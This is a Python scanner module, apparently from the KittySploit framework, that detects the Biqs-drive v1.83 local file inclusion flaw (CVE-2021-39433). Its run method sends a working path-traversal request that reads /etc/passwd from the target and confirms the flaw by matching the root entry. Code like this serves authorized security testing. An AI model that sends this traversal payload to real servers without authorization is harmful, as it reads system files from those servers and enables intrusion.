#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A local file inclusion vulnerability exists in version BIQS IT Biqs-drive v1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'BIQS IT Biqs-drive v1.83 Local File Inclusion Detection',
        'description': 'A local file inclusion vulnerability exists in version BIQS IT Biqs-drive v1.83 and below when sending a specific payload as the file parameter to download/index.php. This allows the attacker to read arbitrary files from the server with the permissions of the configured web-user.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'biqsdrive', 'biqs', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/PinkDraconian/CVE-2021-39433/blob/main/README.md',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39433',
            'https://biqs-drive.be/',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-39433',
    }

    def run(self):
        r = self.http_request(method="GET", path='/download/index.php?file=../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="BIQS IT Biqs-drive v1.83 Local File Inclusion detected",
                path='/download/index.php?file=../../../../../../../../../etc/passwd',
            )
            return True
        return False

